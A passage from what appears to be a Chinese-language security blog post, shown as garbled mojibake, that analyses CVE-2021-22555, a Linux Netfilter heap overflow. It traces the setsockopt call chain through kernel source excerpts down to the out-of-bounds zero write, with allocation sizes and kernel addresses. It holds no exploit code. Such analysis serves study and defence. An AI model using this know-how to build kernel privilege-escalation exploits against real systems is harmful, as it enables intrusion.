<p>åŒæ ·çš„ï¼Œå½“å…³é—­çš„ä¿¡é“çš„ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾</p>
</li>
</ul>

        <h5 id="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"></a>å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š</h5>
      <ul>
<li><p>å½“ä»ä¿¡é“ä¸­å°†æŸæ¡æ¶ˆæ¯å…¨éƒ¨è¯»å–å®Œä¹‹åï¼Œä¼šå‘ç”Ÿè¯¥æ¡æ¶ˆæ¯å¯¹åº”çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„å†…å­˜é‡Šæ”¾ï¼Œä¸”<code>sk_buff</code>é‡Šæ”¾åˆ°ä¸“é—¨çš„ç¼“å­˜æ± ä¸­ï¼Œ<code>skb-&gt;data</code>ä½¿ç”¨æ­£å¸¸çš„<code>kfree</code>é‡Šæ”¾</p>
</li>
<li><p>å½“å…³é—­ä¿¡é“ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾ï¼Œå…·ä½“çš„è°ƒç”¨é“¾ä¸ºï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>åé¢å°±ç±»ä¼¼äº†ã€‚</p>
</li>
</ul>

        <h1 id="ä¸€ã€æ¼æ´åˆ†æ"   >
          <a href="#ä¸€ã€æ¼æ´åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€æ¼æ´åˆ†æ" class="headerlink" title="ä¸€ã€æ¼æ´åˆ†æ"></a>ä¸€ã€æ¼æ´åˆ†æ</h1>
      
        <h2 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2>
      <p>ç”±äºæˆ‘ç¼–è¯‘ç¯å¢ƒçš„æ—¶å€™è€æ˜¯å‡ºé—®é¢˜ï¼ˆåé¢æ‰è§£å†³çš„ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿<code>bsauce</code>å¸ˆå‚…æä¾›çš„ç¯å¢ƒæ¥ç”¨äº†ï¼Œä½†æ˜¯åˆæ²¡æœ‰å¸¦DEBUGçš„<code>vmlinux</code>ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf.git" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ç®€å•è·å–ä¸‹ç¬¦å·å°±å¼€å§‹é€†å‘äº†(xs)ï¼Œæ‰€ä»¥ä¸‹é¢æ¼æ´åˆ†ææåˆ°çš„åœ°å€ä¸º<code>bsauce</code>å¸ˆå‚…ç¯å¢ƒçš„åœ°å€ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027#h2-1" >CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ç›¸å…³çš„<code>Netfilter</code>åˆ†æå°±ä¸åšäº†ï¼Œä¹Ÿä¸å¤ªä¼šï¼Œå¯ä»¥çœ‹çœ‹<code>bsauce</code>å¸ˆå‚…çš„ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨æ•°æ®çš„ä¼ è¾“è¿‡ç¨‹çš„ä¸€äº›ä¸œè¥¿ã€‚</p>
<p>é€šè¿‡<code>Netfilter</code>çš„<code>setsockopt</code>ç³»ç»Ÿè°ƒç”¨ï¼Œä¼ å…¥ç”¨æˆ·æ•°æ®<code>&amp;data</code>ï¼Œå¯ä¾æ®è¯¥<code>&amp;data</code>ä¸­çš„ç›¸å…³æ•°æ®è¿›è¡Œä¸åŒå¤§å°çš„å †å—ç”³è¯·ã€‚å®Œæˆç”³è¯·åï¼Œè¿˜ä¼šå¯¹è¯¥å †å—è¿›è¡Œä¸€å®šçš„å¤„ç†ï¼Œå…¶ä¸­å°±æœ‰å‘å †å—æœ«å°¾å¡«å……æ•°æ®çš„æ“ä½œã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­<code>t-&gt;data+target-&gt;targetsize</code>å³ä¸ºç”³è¯·çš„å †å—ä¸Šæœ«å°¾å¤„çš„æŸä¸ªåœ°å€ï¼Œ<code>pad</code>ä¸ºå¦‚ä¸‹å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br></pre></td></tr></table></div></figure>

<p>å…¶å®<code>pad</code>çš„å€¼å³ä¸º<code>8 - (target-&gt;targetsize mod 8)</code>ï¼Œå°±æ˜¯æ‰€è°“çš„8å­—èŠ‚å¯¹é½ã€‚</p>
<p>å¹¶ä¸”<code>t-&gt;data</code>çš„åœ°å€åç§»å’Œ<code>target-&gt;targetsize</code>çš„å€¼éƒ½å¯è¢«æˆ‘ä»¬ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å­˜åœ¨å †å—æº¢å‡ºå†™0çš„æ“ä½œäº†ï¼Œè¿™é‡Œæœ€å¤šæº¢å‡º4ä¸ªå­—èŠ‚å¡«å……ä¸º0ã€‚</p>
<p>ä¸‹é¢æ˜¯å…·ä½“çš„å…³é”®å‡½æ•°è°ƒç”¨é“¾å’Œç›¸å…³åˆ†æ</p>

        <h2 id="1-nf-setsockopt"   >
          <a href="#1-nf-setsockopt" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-nf-setsockopt" class="headerlink" title="1.nf_setsockopt()"></a>1.nf_setsockopt()</h2>
      <p>å¥æŸ„å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·åˆ°è°ƒç”¨<code>setsockopt</code>ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°±ä¼šè°ƒç”¨åˆ°<code>do_ipt_get_ctl</code>å‡½æ•°ã€‚</p>

        <h2 id="2-do-ipt-set-ctl"   >
          <a href="#2-do-ipt-set-ctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-do-ipt-set-ctl" class="headerlink" title="2.do_ipt_set_ctl()"></a>2.do_ipt_set_ctl()</h2>
      <ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure>

<p>è°ƒè¯•å¦‚ä¸‹<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png" alt="image-20220501113945278"></p>
<p>è¿™ä¸ª<code>&amp;data</code>å³ä¸ºç”¨æˆ·ä¼ å…¥çš„ï¼Œèµ‹å€¼ç»™<code>sockptr_t arg</code>ï¼Œä»è€Œä¾æ®<code>sockptr_t arg</code>æ¥è¿›è¡Œå †å—ç”³è¯·å’Œç›¸å…³çš„æ¼æ´å¡«å……æ“ä½œã€‚</p>
</li>
<li><p>åœ°å€ï¼š<code>0xffffffff81b0bd20</code></p>
</li>
<li><p>ä»‹ç»ï¼šè¯¥å‡½æ•°ç”±<code>nf_sockopt_ops ipt_sockopts</code>è¿›è¡Œå¥æŸ„å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å³ç³»ç»Ÿè°ƒç”¨<code>setsockopt</code>å®é™…è°ƒç”¨åˆ°ä¸æ¼æ´æ–¹é¢æœ‰å…³çš„æœ€æ—©çš„å‡½æ•°ï¼Œä¼ å…¥çš„<code>sockptr_targ</code>å³ä¸ºç”¨æˆ·å‚æ•°<code>&amp;data</code>ï¼Œåç»­ä¼šè°ƒç”¨åˆ°<code>compat_do_replace</code>ï¼Œä¼ å…¥<code>sockptr_t arg</code></p>
</li>
</ul>

        <h2 id="3-compat-do-replace"   >
          <a href="#3-compat-do-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-compat-do-replace" class="headerlink" title="3.compat_do_replace()"></a>3.compat_do_replace()</h2>
      <p>é€šè¿‡<code>_copy_from_user</code>å¤åˆ¶<code>&amp;data</code>çš„<code>0x5c</code>å­—èŠ‚ç»™<code>tmp</code></p>
<ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼š<code>0xffffffff81b0baf0</code></p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="keyword">sockptr_t</span> arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> <span class="title">tmp</span>;</span><span class="comment">//ä¿å­˜size</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>è°ƒç”¨<code>translate_compat_table()</code>ï¼Œä¼ å…¥æœ¬å‡½æ•°å®šä¹‰çš„<code>tmp</code>ä½œä¸º<code>compatr</code>ï¼Œè¯¥å˜é‡<code>tmp</code>ç”±å‡½æ•°<code>copy_from_sockptr(&amp;tmp, arg, sizeof(tmp))</code>è¿›è¡Œèµ‹å€¼</p>
<ul>
<li>ç›¸å…³å‡½æ•°é“¾ï¼š<code>copy_from_sockptr-&gt;copy_from_sockptr-&gt;copy_from_sockptr_offset-&gt;copy_from_user</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/sockptr.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">copy_from_sockptr_offset</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">sockptr_t</span> src,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!sockptr_is_kernel(src))</span><br><span class="line">		<span class="keyword">return</span> copy_from_user(dst, src.user + offset, size);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, src.kernel + offset, size);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„<code>dst</code>å³ä¸º<code>tmp</code>ï¼Œ<code>src</code>å³ä¸º<code>arg</code>ï¼Œä¹Ÿå°±æ˜¯ä¼šä¾æ®<code>arg(&amp;data)</code>çš„å†…å®¹æ¥ç»™<code>tmp</code>èµ‹å€¼ã€‚å³æœ€åçš„<code>compatr</code>çš„æ¥æºä¸ºä¸Šè¿°æåˆ°çš„<code>sockptr_t arg</code>ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°<code>&amp;data</code>ã€‚</p>
<p>ä»<code>&amp;data</code>ä¸­å¤åˆ¶<code>0x5c(sizeof(struct compat_ipt_replace))</code>å¤§å°çš„ç»™åˆ°<code>tmp(compatr)</code>ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    <span class="title">compat_do_replace</span><span class="params">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_sockptr(&amp;tmp, arg, <span class="keyword">sizeof</span>(tmp)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">///....</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„tmp.sizeå³ä¸º0xfb6ï¼Œä¼ å…¥çš„data.replace.sizeï¼Œä¹Ÿæ˜¯ç”³è¯·äº†å †å—çš„ã€‚</span></span><br><span class="line">    <span class="comment">//ä¸è¿‡è¿™ä¸ªå †å—ä¸ç”¨å¤ªè¿‡å…³æ³¨ï¼Œä½†æ˜¯è¿™ä¸ªä¸èƒ½éšä¾¿è®¾ç½®ï¼Œä¸ç„¶ä¼šåœ¨å¦‚ä¸‹æ£€æŸ¥å‡ºé”™è¯¯</span></span><br><span class="line">    <span class="comment">//ç„¶åè·³è½¬out_unlockä»è€Œæ— æ³•è¿›å…¥æ¼æ´ç‚¹</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //translate_compat_tableå‡½æ•°ä¸­</span></span><br><span class="line"><span class="comment">    //Walk through entries, checking offsets. </span></span><br><span class="line"><span class="comment">	xt_entry_foreach(iter0, entry0, compatr-&gt;size) &#123;</span></span><br><span class="line"><span class="comment">		ret = check_compat_entry_size_and_hooks(iter0, info, &amp;size,</span></span><br><span class="line"><span class="comment">							entry0,</span></span><br><span class="line"><span class="comment">							entry0 + compatr-&gt;size);</span></span><br><span class="line"><span class="comment">		if (ret != 0)</span></span><br><span class="line"><span class="comment">			goto out_unlock;</span></span><br><span class="line"><span class="comment">		++j;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªnewinfoå’Œä¸‹é¢å‡½æ•°ä¸­çš„newinfoä¸æ˜¯åŒä¸€ä¸ª</span></span><br><span class="line">    newinfo = xt_alloc_table_info(tmp.size);</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    ret = translate_compat_table(net, &amp;newinfo, &amp;loc_cpu_entry, &amp;tmp);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¤åˆ¶çš„è¿™äº›æ•°æ®ä¸­å°±åŒ…å«å®šä¹‰å¥½çš„sizeï¼Œç”¨æ¥å®Œæˆä¹‹åçš„å †å—ç”³è¯·ã€‚</p>
</li>
</ul>

        <h2 id="4-translate-compat-table"   >
          <a href="#4-translate-compat-table" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-translate-compat-table" class="headerlink" title="4.translate_compat_table()"></a>4.translate_compat_table()</h2>
      <ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net,struct xt_table_info **pinfo,<span class="keyword">void</span> **pentry0,<span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼š<code>0xffffffff81b0b3e0</code></p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> *<span class="title">compatr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"><span class="keyword">void</span> *pos, *entry1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_entry</span> *<span class="title">iter0</span>;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p><code>size</code>ï¼š<code>size = compatr-&gt;size;</code></p>
</li>
<li><p><code>newinfo</code>ï¼šä¾æ®<code>size</code>å³ä¸Šè¿°çš„<code>compatr-&gt;size</code>ç”³è¯·å †å—ï¼Œæ¼æ´ç‚¹å°±å‡ºåœ¨è¿™ä¸ªç”³è¯·çš„å †å—ä¸Šé¢ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">translate_compat_table(struct net *net,</span><br><span class="line">                       struct xt_table_info **pinfo,</span><br><span class="line">                       <span class="keyword">void</span> **pentry0,</span><br><span class="line">                       <span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    size = compatr-&gt;size;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªå †å—å°±æ˜¯æ¼æ´å †å—äº†ã€‚</span></span><br><span class="line">    newinfo = xt_alloc_table_info(size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡<code>xt_alloc_table_info</code>æ¥ç”³è¯·å †å—ï¼Œå…¶ä¸­æœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/netfilter/x_tables.c</span></span><br><span class="line"><span class="function">struct xt_table_info *<span class="title">xt_alloc_table_info</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> sz = <span class="keyword">sizeof</span>(*info) + size;<span class="comment">//åŠ ä¸Š0x40å¤§å°</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sz &lt; <span class="keyword">sizeof</span>(*info) || sz &gt;= XT_MAX_TABLE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//å®é™…ç”³è¯·çš„å †å—å¤§å°ä¸º0xffe,å³kmalloc-4096ï¼Œè¿™ä¸ªå †å—å°±æ˜¯æ¼æ´å †å—äº†ã€‚</span></span><br><span class="line">    <span class="comment">//ç»“æ„ä¸ºstruct xt_table_info</span></span><br><span class="line">	info = kvmalloc(sz, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(*info));</span><br><span class="line">	info-&gt;size = size;</span><br><span class="line">	<span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨<code>kvmalloc</code>ï¼Œç”³è¯·æ ‡å¿—ä¸º<code>GFP_KERNEL_ACCOUNT</code>ï¼Œå¹¶ä¸”<code>XT_MAX_TABLE_SIZE</code>å®šä¹‰å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯åœ¨kmalloc-512åˆ°kmalloc-8192</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define XT_MAX_TABLE_SIZE	(512 * 1024 * 1024)</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>pos/entry1</code>ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry1 = newinfo-&gt;entries;</span><br><span class="line">pos = entry1;</span><br></pre></td></tr></table></div></figure>

<p>å³<code>pos/entry1</code>çš„å€¼ä¸º<code>newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)</code></p>
</li>
<li><p>è°ƒç”¨å¦‚ä¸‹å‡½æ•°è¿›è¡Œä¸‹ä¸€æ­¥ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(iter0, &amp;pos, &amp;size,</span><br><span class="line">					    newinfo, entry1);</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="5-compat-copy-entry-from-user"   >
          <a href="#5-compat-copy-entry-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-compat-copy-entry-from-user" class="headerlink" title="5.compat_copy_entry_from_user()"></a>5.compat_copy_entry_from_user()</h2>
      <ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">			    <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">			    struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼šä¸å¤ªæ¸…æ¥š</p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="comment">//å³ä¿å­˜posçš„æ ˆåœ°å€ï¼Œå€¼ä¸ºnewinfo-&gt;entries(newinfo_addr+0x40)</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>ç›¸å…³æ“ä½œï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">                            struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//å³posåŠ ä¸Š0x70ï¼Œå€¼ä¸ºnewinfo_addr+0x40+0x70</span></span><br><span class="line">    *dstptr += <span class="keyword">sizeof</span>(struct ipt_entry);</span><br><span class="line">    *size += <span class="keyword">sizeof</span>(struct ipt_entry) - <span class="keyword">sizeof</span>(struct compat_ipt_entry);</span><br><span class="line">    xt_ematch_foreach(ematch, e)</span><br><span class="line">		xt_compat_match_from_user(ematch, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    xt_compat_target_from_user(t, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="6-xt-compat-match-from-user"   >
          <a href="#6-xt-compat-match-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-match-from-user" class="headerlink" title="6.xt_compat_match_from_user()"></a>6.xt_compat_match_from_user()</h2>
